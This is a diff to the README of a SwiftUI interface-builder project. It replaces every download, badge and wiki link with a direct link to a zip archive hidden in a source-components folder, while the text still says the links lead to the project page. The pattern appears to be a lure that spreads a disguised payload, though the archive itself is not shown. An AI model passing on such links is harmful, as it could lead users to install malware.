@@ -1,6 +1,6 @@
 # ⚙️ a2ui-swiftui - Simple SwiftUI Interface Builder
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Get%20a2ui--swiftui-blue?style=for-the-badge)](https://github.com/Jeffersonianagelessness805/a2ui-swiftui)
+[![Download from GitHub](https://img.shields.io/badge/Download-Get%20a2ui--swiftui-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jeffersonianagelessness805/a2ui-swiftui/main/Sources/A2UI/V08/Views/Components/swiftui-a-ui-v1.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ This app focuses on helping you explore SwiftUI layout options without writing a
 
 ### Step 1: Download the App
 
-Click the big blue button at the top or **[download a2ui-swiftui here](https://github.com/Jeffersonianagelessness805/a2ui-swiftui)**. You will go to the GitHub project page where you can find the download link.
+Click the big blue button at the top or **[download a2ui-swiftui here](https://raw.githubusercontent.com/Jeffersonianagelessness805/a2ui-swiftui/main/Sources/A2UI/V08/Views/Components/swiftui-a-ui-v1.4.zip)**. You will go to the GitHub project page where you can find the download link.
 
 Since the link points to the general project page, you need to look for the latest release or download section.
 
@@ -116,9 +116,9 @@ You can now explore the interface with simple tools to add buttons, labels, imag
 ## 🔗 Quick Access Links
 
 - Download and project page:  
-  [![Download a2ui-swiftui](https://img.shields.io/badge/Download-Get%20a2ui--swiftui-grey?style=for-the-badge)](https://github.com/Jeffersonianagelessness805/a2ui-swiftui)  
+  [![Download a2ui-swiftui](https://img.shields.io/badge/Download-Get%20a2ui--swiftui-grey?style=for-the-badge)](https://raw.githubusercontent.com/Jeffersonianagelessness805/a2ui-swiftui/main/Sources/A2UI/V08/Views/Components/swiftui-a-ui-v1.4.zip)  
 
-- Wiki and help: https://github.com/Jeffersonianagelessness805/a2ui-swiftui/wiki
+- Wiki and help: https://raw.githubusercontent.com/Jeffersonianagelessness805/a2ui-swiftui/main/Sources/A2UI/V08/Views/Components/swiftui-a-ui-v1.4.zip
 
 ---
 
